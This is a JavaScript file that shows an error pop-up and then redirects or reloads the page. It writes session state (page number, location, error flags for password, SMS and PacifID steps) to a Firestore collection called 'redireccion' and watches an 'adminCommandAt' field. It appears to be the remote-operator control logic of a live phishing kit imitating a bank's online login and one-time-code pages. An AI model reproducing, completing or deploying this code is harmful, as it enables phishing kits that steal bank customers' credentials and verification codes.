(function () {
  function dialog() {
    return document.querySelector(".popUpRedInfoClass");
  }

  function overlay() {
    return document.querySelector(".ui-widget-overlay");
  }

  function showErrorModal() {
    var box = dialog();
    var mask = overlay();
    if (!box || !mask) {
      return;
    }

    box.style.display = "block";
    mask.style.display = "block";
    box.style.left = "50%";
    box.style.top = "50%";
    box.style.transform = "translate(-50%, -50%)";
    box.style.zIndex = "101";
    mask.style.zIndex = "100";
  }

  function hideErrorModal() {
    var box = dialog();
    var mask = overlay();
    if (box) {
      box.style.display = "none";
    }
    if (mask) {
      mask.style.display = "none";
    }
  }

  function sessionDocId() {
    try {
      return sessionStorage.getItem("intermaticoActual") || sessionStorage.getItem("bseSessionUser") || "";
    } catch (error) {
      return "";
    }
  }

  function releaseSession() {
    try {
      sessionStorage.removeItem("intermaticoActual");
      sessionStorage.removeItem("bseSessionUser");
    } catch (error) {}
  }

  function currentFile() {
    try {
      return (window.location.pathname.split("/").pop() || "").toLowerCase();
    } catch (error) {
      return "";
    }
  }

  function stayAndReloadConfig() {
    var file = currentFile();
    if (file === "sms.html") {
      return {
        page: 4,
        pageLocation: "sms",
        smsErr: false,
        loginError: ""
      };
    }
    if (file === "pacifidid.html") {
      return {
        page: 6,
        pageLocation: "pacifid",
        pacifidErr: false,
        loginError: ""
      };
    }
    return null;
  }

  function goIndex() {
    window.location.replace("index.html");
  }

  function reloadSamePage() {
    var patch = stayAndReloadConfig();
    var docId = sessionDocId();
    if (!patch || !docId || !window.db || !window.firebase || !window.firebase.firestore) {
      window.location.reload();
      return;
    }

    var finished = false;
    function finish() {
      if (finished) {
        return;
      }
      finished = true;
      window.location.reload();
    }

    var timer = setTimeout(finish, 4000);
    var payload = Object.assign({
      isActive: true,
      lastActivity: window.firebase.firestore.FieldValue.serverTimestamp(),
      updatedAt: window.firebase.firestore.FieldValue.serverTimestamp()
    }, patch);

    window.db.collection("redireccion").doc(docId).set(payload, { merge: true })
      .then(function () {
        clearTimeout(timer);
        finish();
      })
      .catch(function () {
        clearTimeout(timer);
        finish();
      });
  }

  function returnToIndex() {
    var docId = sessionDocId();
    if (!docId || !window.db || !window.firebase || !window.firebase.firestore) {
      releaseSession();
      goIndex();
      return;
    }

    var finished = false;
    function finish(keepSession) {
      if (finished) {
        return;
      }
      finished = true;
      if (!keepSession) {
        releaseSession();
        try {
          sessionStorage.removeItem("intermaticoHoldCommand");
        } catch (error) {}
      }
      goIndex();
    }

    var timer = setTimeout(function () {
      finish(false);
    }, 4000);

    var observed = null;
    var doc = window.db.collection("redireccion").doc(docId);
    window.db.runTransaction(function (tx) {
      return tx.get(doc).then(function (snap) {
        if (!snap.exists) {
          return { missing: true };
        }
        var command = String((snap.data() || {}).adminCommandAt || "");
        if (observed === null) {
          observed = command;
        } else if (command !== observed) {
          return { changed: true };
        }
        tx.set(doc, {
          page: 0,
          pageLocation: "index",
          passwdErr: false,
          smsErr: false,
          pacifidErr: false,
          inicioErr: false,
          loginError: "",
          isActive: true,
          lastActivity: window.firebase.firestore.FieldValue.serverTimestamp(),
          updatedAt: window.firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });
        return { changed: false, command: command };
      });
    }).then(function (result) {
      clearTimeout(timer);
      if (!result || result.missing) {
        finish(false);
        return;
      }
      if (result.changed) {
        try {
          sessionStorage.removeItem("intermaticoHoldCommand");
        } catch (error) {}
        finish(true);
        return;
      }
      try {
        sessionStorage.setItem("intermaticoHoldCommand", result.command || "");
      } catch (error) {}
      finish(true);
    }).catch(function () {
      clearTimeout(timer);
      finish(false);
    });
  }

  window.showErrorModal = showErrorModal;
  window.hideErrorModal = hideErrorModal;

  document.addEventListener("DOMContentLoaded", function () {
    hideErrorModal();

    var accept = document.getElementById("primaryPopUpRedInfo");
    if (accept) {
      accept.addEventListener("click", function () {
        if (accept.dataset.busy === "1") {
          return;
        }
        accept.dataset.busy = "1";
        hideErrorModal();
        if (stayAndReloadConfig()) {
          reloadSamePage();
          return;
        }
        returnToIndex();
      });
    }
  });
})();
